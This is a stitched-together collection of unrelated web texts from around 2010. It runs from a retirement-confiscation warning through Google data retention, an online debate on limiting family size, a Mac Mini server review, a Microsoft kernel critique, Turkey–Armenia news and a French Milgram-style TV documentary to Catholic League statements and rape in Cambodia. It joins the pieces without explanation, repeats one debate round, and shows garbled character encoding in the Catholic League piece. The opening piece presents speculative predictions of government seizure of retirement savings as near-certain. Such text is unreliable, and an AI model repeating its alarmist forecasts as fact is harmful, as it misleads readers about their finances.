As the United States moves into a new decade of military overreach abroad and national bankruptcy at home , Washington is in a desperate search for more revenue and a solution to the future financing of the trillions in national debt obligations currently held by foreign central banks and investors .
Economists , politicians and smart investors know the dollar ’s days as the world reserve currency are numbered as is our ability to finance the national debt .
Although the historical government solution to unsustainable government debt loads has always been the destruction of the debts by currency depreciation and eventual hyperinflation , there is always an intermediate step used to buy more time for the politicians in power .
This action , usually sidestepped and downplayed by the establishment historians paid to hide the real facts of history is wealth confiscation .
Napoleon had it right when he stated , “ History is a state of lies agreed upon . ”
The largest source of liquid private wealth remaining in the United States are the $ 15 trillion in private retirement funds and the ultimate ownership , control and future of these funds have already been compromised and exchanged for the favorable tax treatment of private retirement plans .
Congress writes the laws , so they can tax , penalize , hold your funds hostage and although they ’d never use the word , “ confiscate ” your assets at their discretion .
The retirement trap I ’m writing about is only a proposal at the present time and since it may well begin in the latter years of the Obama Administration assuming the Democrats can somehow maintain their majorities in Congress , I ’m calling it the “ Obama Retirement Trap ” .
But make no mistake , the government need for current revenue and their frenzied search for a short - term fix to fund a backstop of liquidity to buy future government debt obligations when no credible investors will buy them is an unspoken quest of both political parties .
The establishments of both political parties will do anything to stay in power and this will include raiding and pillaging your retirement funds .
Washington Proposals for a Mandatory Guaranteed Retirement Annuity
The government is getting ready to use that power and in a remarkably cunning way .
The prototype for their plan was devised in 1991 by Alicia H. Munnell , then Director of Research for the Federal Reserve Bank of Boston .
She presented the idea in a paper entitled “ Current Taxation of Qualified Pension Plans : Has the Time Come ? ”
Later she was promoted to Assistant Treasury Secretary , and along with Robert Reich , Henry Cisneros and Hillary Clinton , she began to plot a raid on retirement funds .
One element of the scheme was to create a Mandatory Pension System and fund it with a one - time 15 % tax on retirement assets and a recurring 15 % tax on retirement plan income .
I warned about this in my 1994 book , “ Escape the Pension Trap ” .
Fortunately , the GOP election victory that same year derailed the Mandatory Pension System .
Guess what ?
It ’s back … and nicely repackaged .
It ’s back because , due to slumping tax collection , Washington is on a desperate search for a new revenue stream .
And this time they do n’t want to just tax your retirement assets , they ’re out to take them .
Teresa Ghilarducci : The New Architect of the Retirement Plan Wealth Attack
The latest leftist plan first appeared in 2007 at the Economic Policy Institute : Agenda for Shared Prosperity .
In 2008 , she became the new Director of the Schwartz Center for Economic Policy Analysis at the New School for Social Research .
In her book , “ When I ’m 64 : The Plot Against Pensions and the Plan to Save Them ” , she hypes her retirement solution for millions who do not have adequate retirement savings and her solution is to confiscate most of the retirement assets of successful Americans .
Here ’s her plan …
Each year , the government will put $ 600 into a Guaranteed Retirement Account for you and every other working person in America .
If $ 600 amounts to more than 5 % of your annual compensation ( if you earn more than $ 12,000 ) you will be required to contribute 5 % of your total annual compensation to the GRA .
The Feds will promise to pay a 3 % “ inflation adjusted return ” on each GRA , based on the government ’s Consumer Price Index .
When you retire , you receive a portion of the account each month .
Then — get this — when you die , your heirs receive only 50 % of what ’s in your GRA .
The rest goes to Uncle Sam .
Remember , this is the good news !
Next …
Following the introduction of Guaranteed Retirement Accounts , the next step will be to cap the tax deduction for annual contributions to existing private retirement plans at 5,000 .
( Many Americans will support this , given the hostility to the well - publicized Wall Street mega - bonuses and retirement plans . )
Next will be a tax on every retirement plan ’s income , to provide an immediate flow of revenue to the Feds .
Finally , there would be a prohibition on buying any non-U.S. investment for any retirement plan .
What Would Spark This Nationalization ?
A plan this radical ca n’t just be slipped through Congress .
It can only ride into law on a first - class national crisis .
Have you noticed that somehow the politicians are always able to find one when they need one .
Loss of Triple - A Status for U.S. Treasury Bonds
The loss of triple - A status for Treasury bonds is the most likely trigger .
And according to Steven Hess , Moody ’s lead analyst for the U.S. , it ’s not that far - fetched .
He states , “ The AAA rating of the U.S. is not guaranteed .
So if they do n’t get the deficit down in the next 3 to 4 years to a sustainable level , then the rating will be in jeopardy . ”
Terrorist Attack or Military Disaster
A terrorist attack or a military disaster like the collapse of Pakistan or an Israel / Iran conflict and disruption of oil shipments could close American markets just as we saw in 2001 .
That would create a financial crisis over night .
Another Economic Meltdown
After years of deficits , the greatest hazard to our economy is a run on the dollar and on Treasury securities by foreign investors .
Although America ’s foreign creditors do n’t want to start a run on Treasury debt — they prefer a slow , orderly retreat — no one intends to be the last to head for the exit .
Political or economic pressure in Asia could force Japan or China to take immediate action and dump our debt and knock the prices down to fire - sale levels .
What happens if China decides to cut its losses on U.S. Treasuries and issues a $ 100 billion sell order ?
That ’s only 10 % of their holdings , but it could set off panic selling of dollar - denominated bonds and crush the U.S. stock market like an egg shell .
Mortgage rates would spike , which would suck the housing market into another air pocket .
The President would probably sign an Executive Order closing the markets until order could be restored .
Any of those events would take place in an atmosphere of deep public worry and fear .
That ’s when Washington would come to your rescue and guarantee to restore your retirement funds back to a “ pre-crash ” level .
How nice , right ?
However , in exchange you would need to “ voluntarily ” move your retirement assets into your new Guaranteed Retirement Account .
For those who do n’t sign up for a GRA because they ’re not fooled by the carrot , there would be sticks to consider .
Additional withdrawal penalties and taxes on their retirement plan .
Limitations on permissible investments — nothing that is n’t “ in the public interest . ”
Mandatory minimum holdings for targeted investments , such as Treasury obligations .
Remember , these retirement proposals are just in the discussion stage but progressives are promoting this confiscation agenda to the Obama Administration as a new source of revenue for a bankrupt federal government desperate for additional sources of revenue .
When the next economic or stock market crisis hits , your retirement assets will be at risk from this type confiscation effort regardless of whether the Democrats or Republicans are in control .
The Confiscation Event
At some time during the next decade , a global run on treasury debt and the dollar will also likely take the American stock market down past lows not seen since the financial meltdown crisis in 2008 and 2009 .
The 50 % to 75 % stock market pullback during the actual bankruptcy of the Washington debt and paper dollar will send shock waves through retirees and current plan participants as their private retirement plan balances plummet .
At this time , Washington will come to the rescue and guarantee all private retirement plan market values back to pre-crisis levels .
The gullible American public will overwhelmingly support this effort by switching their dwindling funds into the Guaranteed Retirement Annuity managed by the government .
For the first few years , Washington will probably label those few of us who warn that that Americans have lost their retirement benefits as extremists , Ron Paul paranoids and Tea Party advocates .
Then it will become crystal clear to all Americans that their retirement benefits have been given away for a promise by an evil group of plunderers who have never in their history kept a promise , a guarantee or their word on anything .
The greatest theft of wealth in the history of the world will have taken place and only those few who heeded an early warning will still have their retirement benefits and security .

Not many companies could get away with defending controversial data retention practices by saying that the data is needed to " learn from good guys , fight off bad guys , [ and ] invent the future . "
But that 's how Google sees itself and its practices — not surprising from a company that would give itself an unofficial motto like " do n't be evil . "
I had the chance recently to sit down with two of Google 's top privacy people : deputy general counsel Nicole Wong and security / privacy engineer Alma Whitten .
While the " good guy / bad guy " and " do n't be evil " quotes may seem too cute by half to some , Wong and Whitten made a strong pitch for the truth of both slogans .
In their view , Google really is fighting the good fight when it comes to your online privacy .
Anonymization and its discontents
Google logs an astonishing amount of data , including the search logs from its flagship product .
It keeps this data indefinitely , so searching for a combination of yourwife ' sname and youraddress and " rat poison in her cereal " is not a particularly smart idea ( though search users do this sort of thing anyway ) .
But the company does " anonymize " this data eventually .
The last octet of the IP address is wiped after nine months , which means there are 254 possibilities for the IP address in question ( .0 and .255 are reserved addresses ) .
After 18 months , Google anonymizes the unique cookie data stored in these logs .
This is n't especially ambitious ; Europe 's data protection supervisors have called for IP anonymization after six months and competing search engines like Bing do just that ( and Bing removes the entire IP address , not just the last octet ) .
Yahoo scrubs its data after 90 days .
But Whitten , who was involved in Google 's decisions on such issues , said that Google has done the best it can to keep the retention period to a minimum while still extracting maximum value from that data ... and that this " value " is n't just to Google but also to users .
" Wonderful things that can be done with an abundance of data , " she said .
When Google 's teams began looking at the data retention issue a few years back , they " started with zero " and tried to see if they could make it work .
They could not ;
Google would lose the ability to do too many useful things .
Search data is mined to " learn from the good guys , " in Google 's parlance , by watching how users correct their own spelling mistakes , how they write in their native language , and what sites they visit after searches .
That information has been crucial to Google 's famously algorithm - driven approach to problems like spell check , machine language translation , and improving its main search engine .
Without the algorithms , Google Translate would n't be able to support less - used languages like Catalan and Welsh .
Data is also mined to watch how the " bad guys " run link farms and other Web irritants so that Google can take countermeasures .
Google eventually settled on anonymizing the IP address after nine months , though even here , " we believe that we have lost the ability to do things , " said Whitten .
Web users do n't mind being tracked ?
Instead of cutting the data retention period further , Google is more focused on 1 ) transparency and 2 ) keeping the data locked down safely .
The company believes that when users know what Google keeps and why it keeps it — and when they have the chance to opt out — users are often happy to let Google do its thing .
Wong points to behavioral advertising , which Google jumped into last year .
This sort of advertising relies on a vast ad network across many sites , and the ads record a visitor 's unique cookie .
Google can collate this data on the back end and compile a list of interest categories associated with a particular user cookie ; since most users never clean their cookies , this works well as a general ad targeting mechanism .
When Google rolled out the system in March 2009 , VP Susan Wojcicki said the things that advertisers always say on such occasions : this is good for consumers .
" We believe there is real value to seeing ads about the things that interest you , " she wrote .
" If , for example , you love adventure travel and therefore visit adventure travel sites , Google could show you more ads for activities like hiking trips to Patagonia or African safaris .
While interest - based advertising can infer your interest in adventure travel from the websites you visit , you can also choose your favorite categories , or tell us which categories you do n't want to see ads for . "
Choosing your favorite categories — and opting - out of behavioral ads altogether — is made possible by Google 's Ads Preferences manager .
The site gets limited use ; despite the hundreds of millions who use Google services or are served Google ads , only " tens of thousands " visit the Ads Preferences site each week , I 'm told .
One might assume that these would be the most motivated " opt- outers , " those who actually understand what behavioral advertising is , know how it works , and hate it with a passion .
The Google folks insist that this is n't actually what happens when people visit the Ad Preferences page .
Compared to the number of people who choose to opt out entirely , four times more people merely edit their categories , while ten times more people do nothing at all .
This could mean several things ( are most users just confused about the options and simply do nothing ? ) , but Google takes it as vindication of its willingness to be transparent about what it does , and its willingness to put users in control .
Certainly , there are other companies that could take a page from the Google playbook .
The Ads Preferences manager makes it simple to opt out with single click , but this only applies to one browser ; Google has also built a browser plugin that can remember the setting across browsers and after cookie purges .
Given the sheer amount of hate directed at Google - owned Doubleclick that erupted in our recent comment thread on ad blocking , though , it looks like Google still has some ways to go before it convinces the geekerati that its opt - out behavioral targeting practices truly are n't " evil . "
As Google services rack up increasing amount of data on users , the company 's strategy for reassuring users is based on such transparency , user control , and data safety .
Whitten stresses with pride that Google 's data does n't leak , and Wong notes how aggressively the company pushed back against a broad Department of Justice data request in 2005 .
" We 're not holding onto this frivolously , " Whitten said .
" It 's fundamental to bring value to our users . "
Pro Report this Argument
This is my first debate on this website , so feel free to correct my mistakes .
One topic that I have strongly felt about is limiting the amount of children a couple can have .
Before getting straight to the point , I would like my opponent to take some things into consideration .
In America , we are struggling with a bad economy and limited labor availability .
Thousands of people are fired from work daily , and they are left helpless in the world .
It is very hard to find a job once you are fired , and if you have a family what will you do ?
Most people blame illegal immigrants for taking our jobs , but that 's not the case .
They might be illegal , but they are hard working and they have the jobs that most of us wo n't even want .
If we would want jobs like this , their are tons of them available in local fast food places .
Even if we deport all the illegal immigrants , we will only realize that we have ourselves to blame .
Today , the world is filled with envy and greed , people just stopped working together .
Americas poor relations with other countries has caused the bad economy .
We are in debt , and for what ?
This all brings me to my point .
Overpopulation is a big issue in America .
I understand that other countries such as China have 3 x the population as we do .
But we must think about the future generations that will be ahead of us .
How will our children survive in such chaos ?
With so many children being born , just imagine what they will have to deal with when they are grown up .
There is always a chance some of them will have no jobs , no food , and their own kids to feed .
Most people are n't prepared for job loss , and then it hits them .
Companies only fire their employees because they have to cope with this economy as well .
If Americans keep on having as many kids as they do now , only God knows what will happen in the future .
Con
First I would like to state the obvious , the moment we let the government tell us how many children can be in our family is the moment we give up our freedom .
Already the Government has so much power .
They can start a war , they can raise taxes , they could even legalize meth if they wanted to .
Why would someone want to let the government control their families ?
It is also against the bill of rights to let the government have that power .
The ninth amendment says :
Protection of rights not specifically enumerated in the Bill of Rights .
The enumeration in the Constitution , of certain rights , shall not be construed to deny or disparage others retained by the people .
Secondly , I noticed that you are against abortion .
If someone has three children and gets pregnant again they will have to either put their own child up for adoption , or terminate their baby .
The rate of abortions will hit the roof if there was a limit .
I will save the rest for round two .

Pro Report this Argument I understand that you believe that the government has to much power over what we do .
However , they hardly ever use their powers , and if they do violate our freedoms at least we will be better off in the long run .
I 'm sure if we sit down and realize that overpopulation is harming both us and future generations we will take this into consideration .
I 'm not saying to limit the amount of children to 1 like in China .
I believe that 3 children is enough for a household , anything more than that is unreasonable .
Lets say someone has 4 children and loses their jobs the next day .
How will they feet their children ?
In such an unstable economy , things such as this should be taken into consideration by our citizens .
Even if this is taking our freedoms away , we will soon realize this was done for the greater good .
I mean why do these children have to suffer with starvation , its not their fault .
If we sit down and think , we wo n't be missing out in life by getting this freedom taken away .
I 'm sure 3 children is more than enough for someone to satisfy their needs of enjoyment of life .
Most of us do n't know what we 're expecting when we have a child , and most of us are n't prepared for things such as job loss .
As far as my views on abortion , I never found it fair because you can always prevent having the child in the first place .
Just use condoms and birth control during sex .
I 'm not completely against abortion , if the person was forced into having the child then it is fair to have an abortion .
However , the reckless abortions these days are not fair neither to the child of to the mother .
Con
You say that the just because the government has power does not mean they will use it .
So does that mean we should let the government raid our houses if they want ?
Or what about letting them put our kids in any school they wish ?
The government could use it , that is the point .
You also said this ‘ And if they do violate our freedoms at least we will be better off in the long run . '
Excuse me if this sounds rude , but you kind of sound like a citizen of a communist country .
Our founding fathers said that if there is one thing to keep in America , it is our freedom .
You also did not comment on the ninth amendment .
Are you going against that ?
Over population is not hurting us to the point where we need to limit our families .
If you are talking about running out of room , America still has lots and lots of acres .
If you are talking about jobs , the more people , the more businesses .
More than three children to you may seem unreasonable , but not everyone thinks as you do .
So you think that it is better for a child to not have a life at all then risking a life of being poor ?
Wow .
I am the third child of my family and have a brother who is the forth .
We had nothing in the bank , but always had food to eat , there are many programs and people out there to help .
So just because we hit rock bottom did not make my mother wish that she did not have my little brother .
We are doing just fine now , and he is still here .
We can not let chances take away our freedom .
You claim that people can always ( note the always ) prevent having a child .
There are many reasons why that is not true .
Condoms do not guaranty that pregnancies will not happen .
Sperm can get through the holes that condoms have .
It is the same thing with birth control , it is not a promise .
There are many people out there who think that killing a baby is wrong .
So they would also be very angry .
In China , there are a lot of abortions because people want to have boys .
It has been going on for awhile now .
But now China faces a problem , there are a lot more boy children then there are girls .
If they keep doing this at the rate they are going , it will be hard to get married .
There will be a lot more rape crimes in the future .
Why would we want to bring that here ?
Also , what if someone had four , but had to put the last one up for adoption .
That kid would grow up sad because he or she was ripped away for his or her family .
It would be cruel and unusual .
There is so much I can go on about but I will save the rest for later .

We may not have issues right now but I am talking about future generations ahead .
I believe you do not understand what exactly I am trying to say .
I know that the government can do whatever the wish , but they do n't .
I do n't mean that this limit should be enforced as harshly as in China , but overpopulation is slowly becoming a large issue for us all .
Lets first take into consideration the fresh water crisis .
The world as it is is VERY low on fresh water .
Desalination systems are too costly yet fresh water is on a minimum .
Just imagine what will happen by 2050 if the world continues to grow .
In America alone , the government has predicted that the population will rise to at least 500 Million people by 2050 in America .
Now imagine what our water supply will look like then .
Now , lets talk about energy .
Considering that non-renewable energy is being harshly drained by the second , what do you think will happen when the country is overpopulated ?
Renewable energy is too costly in order to be used , and even if we begin deploying renewable energy we will be too late .
I think that taking away a minor freedom is better than going back to the dark ages .
Lastly , take a look at the money that is being drained from the government .
A majority of illegal immigrants and other people have over 5 children , and request welfare for all of them .
Not only does this create overpopulation , but it drains loads of money from our government .
You say that programs are available to people with starving children , but these programs exactly are the ones which are increasing our debt .
It all adds up , and the final number is breathtaking .
I completely understand that there is no problem now , but if you run the numbers you will see what will happen in the future if this continues .
I have more to say but I will first wait for your reply .
Also as a side note , you should n't be taking this debate personally .
It 's a debate so if your not up for it nobody is forcing you to continue .
Every person has their own opinion and I am willing to share mine with the public .
Also , I am the 2nd out of 6 children in my family , so I know how you feel .
Con
You are contradicting yourself , in round two you said :
" I 'm sure if we sit down and realize that overpopulation is harming both ( US ) and future generations we will take this into consideration . "
Then you go on and say : " We may not have issues right now but I am talking about future generations ahead . "
Please stick to what you say .
It is not fair to go back on what you say because then I have nothing to argue against .
Cost , cost , cost , you keep talking only about cost .
If we take away freedom from our families so we do n't have to spend money , what makes us different than computers ?
Most true Americans who still want freedom would rather pay for water and electricity then limit there families .
Like I said before , the more people , the more businesses , the more wealth .
There is still plenty of space in America .
Again you have failed to answer my question about rights .
Do you think that we should go against the Bill of Rights ?
It is a simple question .
I have another question to ask you ,
What do you think should be the penalty ?
Will they take the child away from the family ?
Will the parents go to jail ?
In no way did I say , or even hint that I would like to drop out of this debate .
I was simply using my story as an example .
Even though there is another argument , I believe that I have already won spelling , reliable sources , and conduct .
Who has the most convincing argument is up to the audience .

It is not fair to go back on what you say because then I have nothing to argue against .
Cost , cost , cost , you keep talking only about cost .
If we take away freedom from our families so we do n't have to spend money , what makes us different than computers ?
Most true Americans who still want freedom would rather pay for water and electricity then limit there families .
Like I said before , the more people , the more businesses , the more wealth .
There is still plenty of space in America .
Again you have failed to answer my question about rights .
Do you think that we should go against the Bill of Rights ?
It is a simple question .
I have another question to ask you ,
What do you think should be the penalty ?
Will they take the child away from the family ?
Will the parents go to jail ?
In no way did I say , or even hint that I would like to drop out of this debate .
I was simply using my story as an example .
Even though there is another argument , I believe that I have already won spelling , reliable sources , and conduct .
Who has the most convincing argument is up to the audience .

When Apple announced the server edition of its popular Mac Mini late in October , I was excited that the company was finally offering a low - cost small - business server at a terrific price point ( $ 999 ) for both the hardware and an unlimited license of Mac OS X Snow Leopard Server .
I 'm a big fan of Apple 's server platform .
Mac OS X Server is based around open standards and includes a range of enterprise - grade technologies that offer a host of powerful and flexible features : Open Directory ( a scalable directory service based around OpenLDAP and Kerberos ) ; established Internet hosting platforms like Apache , BIND for DNS hosting and Dovecot - based mail service ; collaboration tools based on open standards like CalDAV and CardDAV ; a range of deployment and client management tools ; and powerful multiplatform file and print services .
Best of all , it makes these features easily available to both experienced administrators , novices who have never set up a server before and everyone in between .
For small businesses with limited -- or , in some cases , no -- IT staff , having a flexible and robust server platform is important .
So is easy setup , management and backup .
I 've talked previously about the two most recent iterations of Mac OS X Server ( Leopard Server and Snow Leopard Server ) , which offer simplified management through an administration tool -- Server Preferences -- as well as Mac OS X Server 's more robust GUI management utilities and various command - line tools .
Server Preferences , which is patterned after Mac OS X's System Preferences , combines the core functions of a typical small business or workgroup server in one place , whether it 's file or printer sharing , e-mail and Web site hosting , server and client backup management , client autoconfiguration , VPN access or hosting Apple 's suite of collaborative tools ( including shared calendaring , shared contacts , and Apple 's wiki and blog services ) .
It 's designed to be intuitive enough for any Mac user to manage .
The types of companies where Server Preferences and its simplified approach to administration shine -- small offices or workgroups with a limited number of workstations and users -- are exactly the market Apple has targeted with the Mac Mini server .
They 're the kind of shops where an Xserve or a Mac Pro functioning as server hardware would be complete overkill , both in terms of unused potential and cost .
Server Preferences combines the core functions of a typical small business or workgroup server in one place .
Over the past several years , I 've worked with many of these types of small businesses .
In the days before Leopard Server -- the predecessor to Snow Leopard Server -- and Server Preferences , I usually wound up installing a server and being on call for even the most routine tasks , like adding or deleting new users , adjusting access rights to services or file shares , and verifying backups .
Once Leopard Server arrived in 2007 , my direct involvement dropped , since companies finally had a familiar and easy - to - use means of handling these tasks .
During a presentation yesterday about the future of news media with Clay Shirky , the idea of " a chatroulette for news " was jokingly mentioned by Chris Thorpe .

Some technical details :
It was written in Python , pulling data from our content API , and running on Google app engine .
A Microsoft kernel engineer , Dave Probert , gave a presentation last week outlining his thoughts on how the Windows kernel should evolve to meet the needs of the multicore future ahead of us .
Probert complained that current operating systems fail to capitalize on the capabilities of multicore processors and leave users waiting .
" Why should you ever , with all this parallel hardware , ever be waiting for your computer ? " he asked .
Probert said that a future OS should not look like Windows or Linux currently do .
In particular , he targeted the way current OSes share processor cores between multiple applications .
He suggested that in multicore OSes , cores would instead be dedicated to particular processes , with the OS acting more as a hypervisor ; assigning processes to cores , but then leaving them alone to do their thing .
It might then be possible to abandon current abstractions like protected memory — abstractions that are necessary in large part due to the sharing of processor resources between multiple programs and the operating system itself .
The reason for this major change is , apparently , that it will improve the responsiveness of the system .
Current OSes do n't know which task is the most important , and though there are priority levels within the OS , these are generally imprecise , and they depend on programs setting priorities correctly in the first place .
The new approach would purportedly improve responsiveness and provide greater flexibility , and would allow CPUs to " become CPUs again . "
Probert is an engineer for Microsoft , working on future generations of the Windows kernel .
He acknowledged that other engineers at Microsoft did not necessarily agree with his views .
At least , this is what has been claimed ; the 're one original report from IDG , and that 's about the extent of it .
The presentation was made at the Microsoft and Intel - sponsored Universal Parallel Computing Research Center at the University of Illinois at Urbana - Champaign , and the slides unfortunately appear to be available only to university attendees and sponsors .
Either the report is missing some key point from the presentation that explains the ideas , or it's just not that surprising that Probert 's Microsoft colleagues do n't agree with him since , well , the suggestion just does n't make a whole lot of sense .
The big reason that you might have to " wait for your computer " is because your computer has n't done what you 've asked it for .
It 's still loading a document , or rendering a Web page , or computing your spreadsheet , or something else .
Dedicating cores to specific processes is n't going to change that — the problem is not task - switching overhead ( which is negligible , and far , far quicker than human reactions can detect ) or the overhead of protected memory .
The problem is much simpler : programs are slow to react because the tasks they 're doing take a finite amount of time , and if sufficient time has not elapsed the task will not be complete !
It 's true that some programs do bad things like failing to respond to user input while they 're performing lengthy processing , but that 's bad coding , and dedicating cores to processes is n't going to do a thing to prevent it .
That problem needs to be fixed by developers themselves .
The broader problem — splitting up those tasks so that they can be computed on multiple processors simultaneously , and hence get faster and faster as more cores are available — remains a tough nut to crack , and indeed is one of the problems that the Parallel Computing Research Center is working on .
Most peculiar is the alleged claim that this model has " more flexibility " than current models .
Current systems can already dedicate processor cores to a task , by having the OS assign a task to the core and then letting it run uninterrupted .
But they can also multiplex multiple processes onto a single core to enable running more processes than one has cores ( we call this " multitasking " ) .
This is n't to say that operating systems wo n't undergo changes as more cores become more common .
Windows 7 , for example , included a raft of changes to improve the scaling of certain system components when used on large multi-core systems .
But none of these changes required throwing out everything we have now .
It 's not possible that we might yet have to do just that in order to get useful scaling if and when CPUs routinely ship with dozens or hundreds of cores .
But unless something 's missing from the explanation , it 's hard to see just how a massive single - tasking system is the solution to any of our problems .
Turkey warned the Obama administration on Friday of negative diplomaticconsequences if it fails to impede a US resolution branding the WorldWar I - era killing of Armenians as genocide .
Turkish Foreign Minister AhmetDavutoglu said his country , a key Muslim ally of the US , would assess whatmeasures it would take , adding that the issue was a matter of " honor " for Ankara .
A US congressional committee approved themeasure Thursday .
The 23 - 22 vote sends the measure to the full House of Representatives , where prospects for passage are uncertain .
Minutesafter the vote , Turkey withdrew its ambassador to the USHistoriansestimate that up to 1.5 million Armenians were killed by Ottoman Turksaround the time of World War I , an event widely viewed by scholars asthe first genocide of the 20th century .
Turkey denies that the deathsconstituted genocide , saying the toll has been inflated and thosekilled were victims of civil war and unrest .
US President Barack Obama had objected to the resolution , but Turkey wants stronger action to block the resolution .
" Weexpect the US administration to , as of now , display more effectiveefforts .
Otherwise the picture ahead will not be a positive one , " Davutoglu told reporters .
He complained of a lack of " strategic vision " in Washington .
Davutoglu said the Obama administration had notput sufficient weight behind efforts to block the vote and called onWashington to do more to prevent the measure from now going to the fullHouse .
The measure was approved at a time when Washington isexpected to press Turkey to back sanctions against Iran to be approvedin the UN Security Council , where Turkey currently holds a rotating seat .
Turkish cooperation is also important to US operations in Iraq and Afghanistan .
Also at stake are defense contracts .
Turkey is animportant market for US defense companies , many of which had lobbiedagainst the measure .
Davutoglu said the US ambassador in Turkey had beencalled to the country 's Foreign Ministry for talks .
The ambassador , JamesJeffrey , told reporters Friday : " We oppose the resolution .
" Theforeign minister said Turkey was determined to press ahead with effortsto normalize ties with Armenia , but said Turkey would not be" pressured " into doing so .
He added that the vote had put the ratification of agreements to normalize ties with Armenia into jeopardy .
Lastyear , Turkey and Armenia agreed to normalize ties by establishingdiplomatic relations and reopen their shared border , but the agreementshave yet to be approved by their parliaments .
Turkey has been dragging its feet , fearful of upsetting allyAzerbaijan , which balks at any suggestion of the reopening of theborder until its own dispute with Armenia over Nagorno - Karabakh issettled .
The region in Azerbaijan has been under Armenian control .
Armenian - Americangroups have sought congressional affirmation of the killings asgenocide for decades and welcomed Thursday 's vote .
The vote alsocame at a time when relations with the United States — strained byTurkey 's refusal to allow its territory to be used for the invasion of Iraq — had recently improved .
Turkey was the first Muslim country Obamavisited after taking office .

Zone Xtrême is reality TV taken one step further : the contestants , when they get answers wrong , are zapped with an electric shock .
The shocks get more and more powerful as the contestants scream with pain until , on occasion , they appear to have died .
But there 's a twist : in fact , Zone Xtrême is a set - up , and it 's the people administering the shocks that are being tested -- the " contestants " are actors , the audience is fake , and the entire series is n't reality TV but a documentary .
It is , in essence , a repeat of the famous 1960s experiments by Yale psychologist Stanley Milgram , who , in the wake of horrifying revelations about Nazi Germany , was studying people 's obedience to authority .
The Milgram experiments were and remain controversial .
Ethical guidelines introduced after the experiment have made it impossible to reproduce Milgram 's procedure , and U.S. institutional review boards would almost certainly forbid a repeat of the experiment today .
Yet bizarrely , this is not what 's got French commentators worked up .
Rather , they see in this documentary ( called Le Jeu de la Mort , or " the game of death " ) a terrible revelation about the effect of reality TV on society .
( As in Milgram 's experiment , many participants ignored the " victim 's " screams and continued to obey . )
Has reality TV , ask the French commentators , come to the point where it can convince people to kill ?
' How Did We Come to This ? ' asks Marion Festraëts in L'Express .
She points to other reality TV shows that involve the dissection of cadavers .
" Why have these shows garnered such success , despite the repulsion or disgust some of them elicit ?
What influence do these images exert on our society and our spirits ? "
In response , she quotes philosopher Bernard Stiegler : Man is not an impulsive being ...
Our education teaches us not to eat a neighbor 's food when we are hungry , not to attack a woman we covet .
On the contrary , we divert our impulses to transform them into longing and social investment .
But this television augments our impulsive tendencies , ... offering programs ever more mimetic and regressive .
What We Watch Matters , agrees Le Monde 's Frank Nouchi -- and this is n't just a problem with reality shows .
He points to a study of how shows about " violence , egotism , individualism and competition have a negative effect on the people who watch them . "
In fact , he says , supposed news networks " should n't think themselves safe from criticism , " either .
He 's not pleased with the routine appearance of " ' sulfurous ' guests " they bring on to " maintain their audience , " citing a few deliberately controversial folks commenting on September 11 .
Awful , but is Reality TV Really the Problem ?
" Christophe Nick 's documentary , " admits Libération 's Fabrice Rousselot , " sends a chill down the spine and again shows us a pitable image of ourselves and of this televised reality that has long polluted our screens . "
But he , at least , seems more familiar with the Milgram experiments that inspired it .
Can " trash TV " and its " favorite ingredients " of " humiliation and violence ... create potential assassins ? "
He reminds readers of what " Milgram said himself : in his famous test , the subjects ' obedience was not linked to the environment ( here , reality TV ) , but to our normal relationship with authority .
That 's even more terrifying . "

The head of the influential Catholic League says that the priest who allegedly sexually abused 200 deaf boys in Wisconsin did not engage in pedophilia because ‘ the vast majority of the victims [ were ] post - pubescent . ”
Bill Donohue made the argument during a raucous debate on Larry King Live Tuesday night , during which he repeatedly pointed the finger to homosexuality — rather than pedophilia — as the cause of the church ’s sex abuse problems .
ADVERTISEMENT
“ You Ã¢â‚¬â „ ¢ve got to get your facts straight , ” Donohue said , addressing sex abuse victim Thomas Roberts .
“ IÃ¢â‚¬â „ ¢m sorry .
If IÃ¢â‚¬â „ ¢m the only one that Ã¢â‚¬â „ ¢s going to deal with facts tonight then that ’ll be it .
The vast majority of the victims are post - pubescent .
ThatÃ¢â‚¬â „ ¢s not pedophilia , buddy .
ThatÃ¢â‚¬â „ ¢s homosexuality . ”
A rather surprised panel of commentators — which included pop icon Sinead O’Connor — then began to debate at what age , exactly , does sexual attraction to children cease to be pedophilia .
Donohue argued the age at which children become “ post - pubescent ” is around 12 or 13 .
“ Post - pubescent means beyond puberty , ” Donohue said .
“ In other words you Ã¢â‚¬â „ ¢re an adolescent and that Ã¢â‚¬â „ ¢s what homosexuals do and most of them — the molesters — have been homosexuals in the Catholic Church . ”
“ Bill Donohue is so desperate to bash gays and defend the Catholic Church that ’s he ’s willing to pretend that people who are attracted to 13 year old boys are n’t really child predators , ” opines Bill Amato at Crooks and Liars .
ADVERTISEMENT
That theme — that the problem is homosexuality , not pedophilia — has become a common talking point for defenders of the Catholic Church in the wake of a series of scandals involving allegations of sexual abuse of children by priests .
As the Joe. My. God. blog noted on Tuesday , the Catholic League took out an ad in the New York Times arguing that the scandal should be seen as a problem of sexual orientation .
The ad stated in part :
The Times continues to editorialize about the ‘ pedophilia crisis , ’ when all along it ’s been a homosexual crisis .
Eighty percent of the victims of priestly sexual abuse are male and most of them are post - pubescent .
While homosexuality does not cause predatory behavior , and most gay priests are not molesters , most of the molesters have been gay .
ADVERTISEMENT
The ad , signed by Donohue , then goes on to attack the Times for covering the story as an issue of pedophilia , and alleges that “ issues like abortion , gay marriage , and women ’s ordination ” are behind media coverage of the sex abuse scandals .
View the ad here .
Last week , a victim of Father Lawrence Murphy , who allegedly molested up to 200 boys at a school for the deaf in Milwaukee between the 1950s and 1970s , said the pope knew about the accused serial pedophile priest and should be held accountable for Murphy ’s actions .
ADVERTISEMENT
Days later , the pope was accused of approving , in 1980 when he was archbishop of Munich in his native Germany , the transfer from one German parish to another of a priest accused of pedophilia .
And on Tuesday , a lawyer for a man who claims he was molested as a teen by a priest in Miami said the Congregation of the Doctrine of the Faith under then Cardinal Joseph Ratzinger “ lost the paperwork ” when a US bishop began the process of defrocking the abusive priest .
The following video was broadcast on CNN ’s Larry King Live , Tuesday March 30 , 2010 , and uploaded to the Web by Crooks and Liars .

Most Cambodians live with a weak justice system and few rights Human rights organisations in Cambodia have called for the government to tackle the rising incidence of rape .
A report by Amnesty International says victims have limited access to justice , medical services and counselling .
It claims that rape cases are often settled by cash payments to the victim - or bribes to the authorities .
Official statistics show a significant increase of the number of rapes reported to police last year - almost a quarter more than in 2008 .
But Amnesty says the true figure may be much higher - because many victims never tell the authorities about their attacks .
Commander 's block
Its report highlights a lack of faith in law enforcement officials and the judicial process .
One incident cited involved a policeman accused of sexually assaulting a woman in a karaoke bar .
His commanding officer refused to press charges - and insisted the attack could not be considered rape , as the woman had not been a virgin .
